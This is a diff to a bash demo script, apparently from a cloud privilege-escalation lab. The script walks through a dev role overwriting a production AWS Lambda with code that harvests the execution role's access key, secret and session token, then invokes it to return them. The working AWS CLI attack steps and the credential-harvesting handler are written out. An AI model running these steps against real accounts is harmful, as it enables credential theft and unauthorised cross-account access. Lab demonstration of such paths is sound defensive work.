@@ -4,7 +4,28 @@
 # This script demonstrates how a dev role can update and invoke a prod Lambda function
 # to extract credentials from the Lambda execution role
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 echo "🚀 Starting Cross-Account Lambda Attack Demo"
 echo "=============================================="
@@ -33,6 +54,7 @@ DEV_ROLE_ARN="arn:aws:iam::${DEV_ROLE_ARN}:role/pl-dev-lambda-invoke-role"
 echo "Assuming role: $DEV_ROLE_ARN"
 
 # Get temporary credentials for the dev role
+show_attack_cmd aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn "$DEV_ROLE_ARN" --role-session-name "lambda-attack-demo" --output json
 TEMP_CREDS=$(aws sts assume-role \
     --profile pl-pathfinding-starting-user-dev \
     --role-arn "$DEV_ROLE_ARN" \
@@ -84,11 +106,11 @@ def lambda_handler(event, context):
     """
     Malicious Lambda function that extracts credentials and sends them to attacker
     """
-    
+
     # Get the Lambda execution role credentials
     session = boto3.Session()
     credentials = session.get_credentials()
-    
+
     # Extract credential information
     cred_data = {
         'access_key_id': credentials.access_key,
@@ -99,10 +121,10 @@ def lambda_handler(event, context):
         'function_arn': context.invoked_function_arn,
         'account_id': context.invoked_function_arn.split(':')[4]
     }
-    
+
     # In a real attack, this would send to attacker's server
     # For demo purposes, we'll just return the credentials
-    
+
     return {
         'statusCode': 200,
         'body': json.dumps({
@@ -125,6 +147,7 @@ echo "Target function: $LAMBDA_FUNCTION_NAME"
 echo "Using ARN: $LAMBDA_FUNCTION_ARN"
 
 # Update the function code using the full ARN
+show_attack_cmd aws lambda update-function-code --function-name "$LAMBDA_FUNCTION_ARN" --zip-file "fileb://malicious_lambda.zip"
 aws lambda update-function-code \
     --function-name "$LAMBDA_FUNCTION_ARN" \
     --zip-file "fileb://malicious_lambda.zip"
@@ -140,6 +163,7 @@ fi
 echo ""
 echo "📋 Step 5: Invoking malicious Lambda function to extract credentials..."
 
+show_attack_cmd aws lambda invoke --function-name "$LAMBDA_FUNCTION_ARN" --payload '{}' /tmp/lambda_response.json
 RESPONSE=$(aws lambda invoke \
     --function-name "$LAMBDA_FUNCTION_ARN" \
     --payload '{}' \
@@ -170,6 +194,13 @@ echo "⚠️  This demonstrates a critical cross-account privilege escalation vu
 echo ""
 echo "🧹 Cleaning up temporary files..."
 rm -f /tmp/malicious_lambda.py /tmp/malicious_lambda.zip /tmp/lambda_response.json
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n\033[1;33mAttack Commands:\033[0m"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo ""
 echo "✅ Attack demonstration completed successfully!"
